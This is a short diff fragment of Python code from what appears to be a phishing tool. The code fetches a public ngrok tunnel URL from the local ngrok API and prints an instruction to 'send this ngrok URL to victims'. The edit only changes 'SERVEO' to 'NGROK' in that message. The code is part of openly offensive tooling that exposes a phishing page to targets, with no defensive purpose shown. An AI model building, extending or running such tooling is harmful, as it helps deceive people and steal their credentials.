@@ -134,7 +134,7 @@
 +            output = check_output("curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[0-9a-z]*\.ngrok.io'",shell=True)
 +            url = str(output).strip("b ' \ n r")
  
-+            print("\n{0}[{1}!{0}]{1} SEND THIS SERVEO URL TO VICTIMS-\n\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:1111\n{0}[{1}*{0}]{1} NGROK URL: {2}".format(RED, DEFAULT, GREEN) + url + "{1}".format(RED, DEFAULT, GREEN))
++            print("\n{0}[{1}!{0}]{1} SEND THIS NGROK URL TO VICTIMS-\n\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:1111\n{0}[{1}*{0}]{1} NGROK URL: {2}".format(RED, DEFAULT, GREEN) + url + "{1}".format(RED, DEFAULT, GREEN))
          elif choice == '2':
              system('clear')
              runServeo()
